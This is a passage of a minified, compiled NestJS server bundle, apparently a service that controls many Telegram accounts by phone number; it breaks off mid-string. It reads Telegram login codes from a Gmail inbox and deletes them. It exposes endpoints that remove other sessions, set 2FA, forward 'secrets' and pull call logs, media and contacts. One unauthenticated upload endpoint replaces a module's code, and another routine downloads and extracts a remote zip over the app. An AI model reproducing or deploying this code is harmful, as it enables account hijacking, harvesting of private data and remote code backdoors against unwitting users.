(()=>{"use strict";var e={8383:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.MailReader=void 0;const i=o(2559),n=o(6185);class r{constructor(){this.isReady=!1,this.result="",this.imap=new i({user:process.env.GMAIL_ADD,password:process.env.GMAIL_PASS,host:"imap.gmail.com",port:993,tls:!0,tlsOptions:{rejectUnauthorized:!1}}),this.imap.on("ready",(()=>{console.log("Mail is Ready"),this.isReady=!0})),this.imap.on("error",(e=>{console.error("SomeError:",e),this.isReady=!1})),this.imap.on("end",(()=>{console.log("Connection ended"),this.isReady=!1}))}static getInstance(){return r.instance||(r.instance=new r),r.instance}async connectToMail(){console.log("Connecting to mail server");try{this.imap.connect(),this.isReady=!0,console.log("Connected to mail server")}catch(e){throw console.error("Error connecting to mail server:",(0,n.parseError)(e)),e}}async disconnectFromMail(){console.log("Disconnecting from mail server");try{this.imap.end(),this.isReady=!1,console.log("Disconnected from mail server")}catch(e){throw console.error("Error disconnecting from mail server:",(0,n.parseError)(e)),e}}async isMailReady(){return this.isReady}async getCode(){console.log("MailReady : ",this.isReady),this.isReady||(console.log("Re-Connecting mail server"),await this.connectToMail(),await(0,n.sleep)(1e4));try{await this.openInbox();const e=[["FROM","noreply@telegram.org"]],t={bodies:["HEADER","TEXT"],markSeen:!0};console.log("Inbox Opened");const o=await new Promise(((t,o)=>{this.imap.search(e,((e,i)=>{e?(console.error("Search error:",(0,n.parseError)(e)),o(e)):t(i)}))}));if(o.length>0){console.log("Emails found:",o.length);const e=o.length,i=this.imap.fetch([o[e-1]],t);await new Promise(((t,r)=>{i.on("message",((i,a)=>{const s=[];i.on("body",((e,t)=>{let o="";e.on("data",(e=>o+=e.toString("utf8"))),e.on("end",(()=>{"TEXT"===t.which&&s.push(o),this.imap.seq.addFlags([a],"\\Deleted",(e=>{e&&r(e),this.imap.expunge((e=>{e&&r(e),console.log("Deleted message")}))}))}))})),i.once("end",(()=>{console.log(`Email #${a}, Latest ${o[e-1]}`),console.log("EmailDataLength:",s.length),console.log("Mail:",s[s.length-1].split(".")),this.result=(0,n.fetchNumbersFromString)(s[s.length-1].split(".")[0]),t()}))})),i.once("end",(()=>{console.log("Fetched mails"),t()}))}))}else console.log("No new emails found");return console.log("Returning result:",this.result),this.result}catch(e){throw console.error("Error:",e),this.isReady=!1,e}}async openInbox(){await new Promise(((e,t)=>{this.imap.openBox("INBOX",!1,(o=>{o?(console.error("Open Inbox error:",(0,n.parseError)(o)),t(o)):(console.log("Inbox opened"),e())}))}))}}t.MailReader=r},6509:function(e,t,o){var i,n=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.AppController=void 0;const s=o(3563),c=o(2918),l=o(9556),p=o(9742),d=o(9896),u=o(8461),y=o(6928);let m=class{constructor(e){this.appService=e,this.commonServicePath=(0,y.join)(__dirname,"..","node_modules","commonService","index.js")}getHello(){return this.appService.getHello()}async uploadFileAndUpdate(e){try{const t=(0,y.join)(__dirname,"..","node_modules","commonService"),o=(0,y.join)(t,"index.js");(0,d.existsSync)(t)||(0,d.mkdirSync)(t,{recursive:!0});const i=await d.promises.readFile(e.path);return await d.promises.writeFile(o,i),console.log("commonService/index.js updated successfully."),{message:"commonService/index.js updated successfully"}}catch(e){throw console.error("Failed to update commonService/index.js:",e),e}}};t.AppController=m,n([(0,s.Get)(),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",String)],m.prototype,"getHello",null),n([(0,s.Post)("updateCommonService"),(0,s.UseInterceptors)((0,l.FileInterceptor)("file",{storage:(0,u.diskStorage)({destination:(e,t,o)=>{try{const e=(0,y.join)(__dirname,"..","uploads");(0,d.existsSync)(e)||(0,d.mkdirSync)(e,{recursive:!0}),o(null,e)}catch(e){o(e,null)}},filename:(e,t,o)=>{o(null,"index.js")}})})),(0,p.ApiOperation)({summary:"Upload a file to update commonService index.js"}),(0,p.ApiConsumes)("multipart/form-data"),(0,p.ApiBody)({schema:{type:"object",properties:{file:{type:"string",format:"binary"}}}}),a(0,(0,s.UploadedFile)()),r("design:type",Function),r("design:paramtypes",["function"==typeof(i=void 0!==u.File&&u.File)?i:Object]),r("design:returntype",Promise)],m.prototype,"uploadFileAndUpdate",null),t.AppController=m=n([(0,s.Controller)(),r("design:paramtypes",[c.AppService])],m)},3205:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppModule=void 0;const n=o(3563),r=o(7422),a=o(6158),s=o(8009),c=o(282),l=o(8421),p=o(3322),d=o(6061),u=o(5774),y=o(1324),m=o(6509),h=o(2918),f=o(3924),g=o(3177),v=o(7106),w=o(5014),b=o(4181),P=o(5471),S=o(3085),C=o(1373),A=o(886),O=o(9605),M=o(889);let R=class{configure(e){e.apply(f.LoggerMiddleware).forRoutes("*")}};t.AppModule=R,t.AppModule=R=i([(0,n.Module)({imports:[u.initModule,c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,r.UsersModule,l.BufferClientModule,d.ArchivedClientModule,y.ChannelsModule,C.PromoteClientModule,g.BuildModule,v.UpiIdModule,w.PromoteMsgModule,S.PromoteStatModule,b.StatModule,P.Stat2Module,A.TgSignupModule,O.TransactionModule,M.NpointModule],controllers:[m.AppController],providers:[h.AppService],exports:[c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,r.UsersModule,l.BufferClientModule,d.ArchivedClientModule,y.ChannelsModule,C.PromoteClientModule,A.TgSignupModule,O.TransactionModule]})],R)},2918:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppService=void 0;const n=o(3563);let r=class{getHello(){return"Hello World!"}};t.AppService=r,t.AppService=r=i([(0,n.Injectable)()],r)},6790:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.CloudinaryService=void 0,console.log("in Cloudinary");const i=o(1416),n=o(6928),r=o(9896),a=o(6185),s=o(4650);class c{constructor(){this.resources=new Map,i.v2.config({cloud_name:process.env.CL_NAME,api_key:process.env.CL_APIKEY,api_secret:process.env.CL_APISECRET})}static async getInstance(e){return c.instance||(c.instance=new c),await c.instance.getResourcesFromFolder(e),c.instance}async downloadAndExtractZip(e){const t=n.resolve(__dirname,"temp.zip"),o=n.resolve(__dirname,"../"),i=await(0,a.fetchWithTimeout)(e,{responseType:"arraybuffer"});if(200!==i?.status)throw new Error(`Unable to download zip file from ${e}`);r.writeFileSync(t,i.data),console.log("Zip file downloaded successfully."),new s(t).extractAllTo(o,!0),console.log("Zip file extracted successfully."),r.unlinkSync(t)}async getResourcesFromFolder(e){console.log("FETCHING NEW FILES!! from CLOUDINARY"),await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${e}/files/download-all`)}async createNewFolder(e){await this.createFolder(e),await this.uploadFilesToFolder(e)}async overwriteFile(){try{const e=await i.v2.uploader.upload("./src/test.js",{resource_type:"auto",overwrite:!0,invalidate:!0,public_id:"index_nbzca5.js"});console.log(e)}catch(e){(0,a.parseError)(e)}}async findAndSaveResources(e,t){try{const{resources:o}=await i.v2.api.resources({resource_type:t,type:"upload",prefix:e,max_results:500});await Promise.all(o.map((async e=>{try{this.resources.set(e.public_id.split("/")[1].split("_")[0],e.url),await async function(e,t){try{const o=e.substring(e.lastIndexOf(".")+1),i=process.cwd(),s=n.join(i,`${t}.${o}`);console.log(s);const c=await(0,a.fetchWithTimeout)(e,{responseType:"arraybuffer"},2);if("OK"!==c?.statusText)throw new Error(`Unable to download file from ${e}`);r.existsSync(s)?(r.unlinkSync(s),r.writeFileSync(s,c.data,"binary"),console.log(`${t}.${o} Replaced!!`)):(r.writeFileSync(s,c.data,"binary"),console.log(`${t}.${o} Saved!!`))}catch(e){(0,a.parseError)(e)}}(e.url,e.public_id.split("/")[1].split("_")[0])}catch(t){console.log(e),(0,a.parseError)(t)}})))}catch(e){(0,a.parseError)(e)}}async createFolder(e){try{return await i.v2.api.create_folder(e)}catch(e){throw console.error("Error creating folder:",e),e}}async uploadFilesToFolder(e){const t=Array.from(this.resources.entries()).map((async([t,o])=>{try{return await i.v2.uploader.upload_large(o,{folder:e,resource_type:"auto",public_id:t})}catch(e){throw console.error("Error uploading file:",e),e}}));try{return await Promise.all(t)}catch(e){throw console.error("Error uploading files:",e),e}}async printResources(){try{this.resources?.forEach(((e,t)=>{console.log(t,":",e)}))}catch(e){(0,a.parseError)(e)}}get(e){try{return this.resources.get(e)||""}catch(e){(0,a.parseError)(e)}}getBuffer(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}}t.CloudinaryService=c},5691:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationSchema=t.Configuration=void 0;const n=o(5839),r=o(6037);let a=class{};t.Configuration=a,t.Configuration=a=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.ConfigurationSchema=n.SchemaFactory.createForClass(a),t.ConfigurationSchema.add({type:r.default.Schema.Types.Mixed})},7902:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationController=void 0;const a=o(3563),s=o(9742),c=o(6759);let l=class{constructor(e){this.configurationService=e}async findOne(){return this.configurationService.findOne()}async update(e){return this.configurationService.update(e)}};t.ConfigurationController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get configuration data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update configuration"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],l.prototype,"update",null),t.ConfigurationController=l=i([(0,s.ApiTags)("Configuration"),(0,a.Controller)("configuration"),n("design:paramtypes",[c.ConfigurationService])],l)},5774:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.initModule=void 0;const a=o(3563),s=o(3428),c=o(5839),l=o(6759),p=o(5691),d=o(7902),u=o(6037),y=o(6185);let m=class{constructor(e){this.connection=e}async onModuleInit(){console.log(`Started :: ${process.env.clientId}`),await(0,y.fetchWithTimeout)(`${(0,y.ppplbot)()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`)}async onModuleDestroy(){console.log("Init Module Destroying"),await(0,y.fetchWithTimeout)(`${(0,y.ppplbot)()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`),this.closeConnection()}closeConnection(){console.log("Closing mongoose connection"),this.connection.close(!0)}};t.initModule=m,t.initModule=m=i([(0,a.Global)(),(0,a.Module)({imports:[s.ConfigModule.forRoot(),c.MongooseModule.forRootAsync({useFactory:()=>({uri:process.env.mongouri})}),c.MongooseModule.forFeature([{name:"configurationModule",collection:"configuration",schema:p.ConfigurationSchema}])],providers:[l.ConfigurationService],controllers:[d.ConfigurationController],exports:[s.ConfigModule,c.MongooseModule]}),r(0,(0,a.Inject)((0,c.getConnectionToken)())),n("design:paramtypes",[u.Connection])],m)},6759:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.configurationModel=e,this.setEnv()}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.configurationModel.findOne({}).exec();if(!e)throw new a.NotFoundException("configurationModel not found");return e}async setEnv(){console.log("Setting Envs");const e={...await this.configurationModel.findOne({},{_id:0})};for(const t in e)console.log("setting",t),process.env[t]=e[t];console.log("finished setting env")}async update(e){delete e._id;const t=await this.configurationModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("configurationModel not found");return t}};t.ConfigurationService=l,t.ConfigurationService=l=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("configurationModule")),n("design:paramtypes",[c.Model])],l)},7330:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramController=void 0;const a=o(3563),s=o(9742),c=o(2995),l=o(9896),p=o(8062),d=o(7777);let u=class{constructor(e){this.telegramService=e}async connectToTelegram(e){return await this.telegramService.createClient(e)}async connectClient(e){return await this.connectToTelegram(e),"Client connected successfully"}async disconnect(e){return await this.telegramService.deleteClient(e)}async disconnectAll(){return await this.telegramService.disconnectAll(),"Clients disconnected successfully"}async getMessages(e,t,o=8){return await this.connectToTelegram(e),this.telegramService.getMessages(e,t,o)}async getMessagesNew(e,t,o,i=20){return await this.telegramService.createClient(e,!1,!1),await this.telegramService.getMessagesNew(e,t,o,i)}async getChatId(e,t){return await this.connectToTelegram(e),await this.telegramService.getChatId(e,t)}async sendInlineMessage(e,t,o,i){return await this.connectToTelegram(e),await this.telegramService.sendInlineMessage(e,t,o,i)}async lastActiveTime(e){return await this.connectToTelegram(e),await this.telegramService.getLastActiveTime(e)}async joinChannels(e,t){return await this.connectToTelegram(e),"Joining Channels"}async removeOtherAuths(e){return await this.connectToTelegram(e),await this.telegramService.removeOtherAuths(e),"Authorizations removed successfully"}async getSelfMsgsInfo(e){return await this.connectToTelegram(e),await this.telegramService.getSelfMsgsInfo(e)}async createGroup(e){return await this.connectToTelegram(e),await this.telegramService.createGroup(e)}async forwardSecrets(e,t){return await this.connectToTelegram(e),await this.telegramService.forwardSecrets(e,t)}async joinChannelAndForward(e,t,o){return await this.telegramService.createClient(e,!1,!1),await this.telegramService.joinChannelAndForward(e,t,o)}async leaveChannel(e,t){return await this.connectToTelegram(e),this.telegramService.leaveChannel(e,t),"Started Leaving Channels"}async getCallLog(e){return await this.connectToTelegram(e),await this.telegramService.getCallLog(e)}async getMe(e){return await this.connectToTelegram(e),await this.telegramService.getMe(e)}async getMedia(e){return await this.connectToTelegram(e),await this.telegramService.getmedia(e)}async getChannelInfo(e,t=!1){return await this.connectToTelegram(e),await this.telegramService.getChannelInfo(e,t)}async leaveChannels(e){return await this.connectToTelegram(e),this.telegramService.leaveChannels(e),"Started Leaving Channels"}async getAuths(e){return await this.connectToTelegram(e),await this.telegramService.getAuths(e)}async set2Fa(e){return await this.connectToTelegram(e),await this.telegramService.set2Fa(e)}async setProfilePic(e,t){return await this.connectToTelegram(e),await this.telegramService.setProfilePic(e,t)}async updatePrivacy(e){return await this.connectToTelegram(e),await this.telegramService.updatePrivacy(e)}async updateUsername(e,t){return await this.connectToTelegram(e),await this.telegramService.updateUsername(e,t)}async getGrpMembers(e,t){return await this.connectToTelegram(e),await this.telegramService.getGrpMembers(e,t)}async addContact(e){const{mobile:t,data:o,prefix:i}=e;return await this.connectToTelegram(t),this.telegramService.addContact(t,o,i)}async addContacts(e){const{mobile:t,phoneNumbers:o,prefix:i}=e;return await this.connectToTelegram(t),this.telegramService.addContacts(t,o,i)}async newSession(e){return await this.connectToTelegram(e),await this.telegramService.createNewSession(e)}async updateName(e,t,o){return await this.connectToTelegram(e),await this.telegramService.updateNameandBio(e,t,o)}async getMediaMetadata(e,t,o,i){return await this.telegramService.createClient(e,!1,!1),this.telegramService.getMediaMetadata(e,t,o,i)}async downloadMediaFile(e,t,o,i){await this.connectToTelegram(e),await this.telegramService.downloadMediaFile(e,t,o,i)}async downloadProfilePic(e,t,o){await this.connectToTelegram(e);try{const i=await this.telegramService.downloadProfilePic(e,t);if(!i)return o.status(404).send("Profile photo not found.");o.download(i,"profile_pic.jpg",(e=>{e&&(console.error("Error sending the file:",e),o.status(500).send("Error downloading the file.")),l.unlink(i,(e=>{e&&console.error("Error deleting the file:",e)}))}))}catch(e){console.error("Error in endpoint:",e),o.status(500).send("An error occurred.")}}async forrward(e,t,o){return await this.connectToTelegram(e),await this.telegramService.forwardMessage(e,t,o)}async deleteChat(e,t){return await this.connectToTelegram(e),await this.telegramService.deleteChat(e,t)}async deleteProfilePics(e){return await this.connectToTelegram(e),await this.telegramService.deleteProfilePhotos(e)}};t.TelegramController=u,i([(0,a.Get)("connect/:mobile"),(0,s.ApiOperation)({summary:"Create and connect a new Telegram client"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"connectClient",null),i([(0,a.Get)("disconnect/:mobile"),(0,s.ApiOperation)({summary:"Create and connect a new Telegram client"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"disconnect",null),i([(0,a.Get)("disconnectAll"),(0,s.ApiOperation)({summary:"Create and connect a new Telegram client"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"disconnectAll",null),i([(0,a.Get)("messages/:mobile"),(0,s.ApiOperation)({summary:"Get messages from Telegram"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiQuery)({name:"username",description:"Username to fetch messages from",required:!0}),(0,s.ApiQuery)({name:"limit",description:"Limit the number of messages",required:!1}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("username")),r(2,(0,a.Query)("limit")),n("design:type",Function),n("design:paramtypes",[String,String,Number]),n("design:returntype",Promise)],u.prototype,"getMessages",null),i([(0,a.Get)("messagesNew/:mobile"),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiQuery)({name:"chatId",description:"Username to fetch messages from",required:!0}),(0,s.ApiQuery)({name:"limit",description:"Limit the number of messages",required:!1}),(0,s.ApiQuery)({name:"offset",description:"offset the number of messages",required:!1}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("chatId")),r(2,(0,a.Query)("offset")),r(3,(0,a.Query)("limit")),n("design:type",Function),n("design:paramtypes",[String,String,Number,Number]),n("design:returntype",Promise)],u.prototype,"getMessagesNew",null),i([(0,a.Get)("chatid/:mobile"),(0,s.ApiOperation)({summary:"Get chat ID for a username"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiQuery)({name:"username",description:"Username to fetch chat ID for",required:!0}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("username")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"getChatId",null),i([(0,a.Get)("sendInlineMessage/:mobile"),(0,s.ApiOperation)({summary:"Get chat ID for a username"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiQuery)({name:"chatId",description:"chat ID of user",required:!0}),(0,s.ApiQuery)({name:"message",description:"message ID of user",required:!0}),(0,s.ApiQuery)({name:"url",description:"url ID of user",required:!0}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("chatId")),r(2,(0,a.Query)("message")),r(3,(0,a.Query)("url")),n("design:type",Function),n("design:paramtypes",[String,String,String,String]),n("design:returntype",Promise)],u.prototype,"sendInlineMessage",null),i([(0,a.Get)("lastActiveTime/:mobile"),(0,s.ApiOperation)({summary:"Get Last Active time of a user"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"lastActiveTime",null),i([(0,a.Post)("joinchannels/:mobile"),(0,s.ApiOperation)({summary:"Join channels"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiBody)({description:"Channels string",schema:{type:"object",properties:{channels:{type:"string"}}}}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)("channels")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"joinChannels",null),i([(0,a.Get)("removeauths/:mobile"),(0,s.ApiOperation)({summary:"Remove other authorizations"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"removeOtherAuths",null),i([(0,a.Get)("selfmsgsinfo/:mobile"),(0,s.ApiOperation)({summary:"Get self messages info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getSelfMsgsInfo",null),i([(0,a.Get)("createGroup/:mobile"),(0,s.ApiOperation)({summary:"Get self messages info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"createGroup",null),i([(0,a.Get)("forwardSecrets/:mobile/:fromId"),(0,s.ApiOperation)({summary:"Get self messages info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("fromId")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"forwardSecrets",null),i([(0,a.Get)("joinChannelAndForward/:mobile/:fromId/:channel"),(0,s.ApiOperation)({summary:"Get self messages info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("fromId")),r(2,(0,a.Param)("channel")),n("design:type",Function),n("design:paramtypes",[String,String,String]),n("design:returntype",Promise)],u.prototype,"joinChannelAndForward",null),i([(0,a.Get)("leaveChannel/:mobile/:channel"),(0,s.ApiOperation)({summary:"Get channel info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("channel")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"leaveChannel",null),i([(0,a.Get)("getCallLog/:mobile"),(0,s.ApiOperation)({summary:"Get CallLog  info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getCallLog",null),i([(0,a.Get)("getMe/:mobile"),(0,s.ApiOperation)({summary:"Get me  info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getMe",null),i([(0,a.Get)("getMedia/:mobile"),(0,s.ApiOperation)({summary:"Get me  info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getMedia",null),i([(0,a.Get)("channelinfo/:mobile"),(0,s.ApiOperation)({summary:"Get channel info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,s.ApiQuery)({name:"sendIds",description:"Whether to send IDs or not",required:!1}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("sendIds")),n("design:type",Function),n("design:paramtypes",[String,Boolean]),n("design:returntype",Promise)],u.prototype,"getChannelInfo",null),i([(0,a.Get)("leaveChannels/:mobile"),(0,s.ApiOperation)({summary:"Get channel info"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"leaveChannels",null),i([(0,a.Get)("auths/:mobile"),(0,s.ApiOperation)({summary:"Get authorizations"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"getAuths",null),i([(0,a.Get)("set2Fa/:mobile"),(0,s.ApiOperation)({summary:"Set 2Fa"}),(0,s.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"set2Fa",null),i([(0,a.Get)("setprofilepic/:mobile/:name"),(0,s.ApiOperation)({summary:"Set Profile Picture"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiParam)({name:"name",description:"Profile name",type:String}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Param)("name")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"setProfilePic",null),i([(0,a.Get)("updatePrivacy/:mobile"),(0,s.ApiOperation)({summary:"Update Privacy Settings"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"updatePrivacy",null),i([(0,a.Get)("UpdateUsername/:mobile"),(0,s.ApiOperation)({summary:"Update Username"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiQuery)({name:"username",description:"New username",type:String,required:!1}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("username")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"updateUsername",null),i([(0,a.Get)("getGrpMembers/:mobile"),(0,s.ApiOperation)({summary:"Update Username"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),(0,s.ApiQuery)({name:"username",description:"New username",type:String}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Query)("username")),n("design:type",Function),n("design:paramtypes",[String,String]),n("design:returntype",Promise)],u.prototype,"getGrpMembers",null),i([(0,a.Post)("addcontact"),(0,s.ApiOperation)({summary:"Add multiple contacts"}),(0,s.ApiBody)({description:"Add contacts with a phone number array and a prefix for 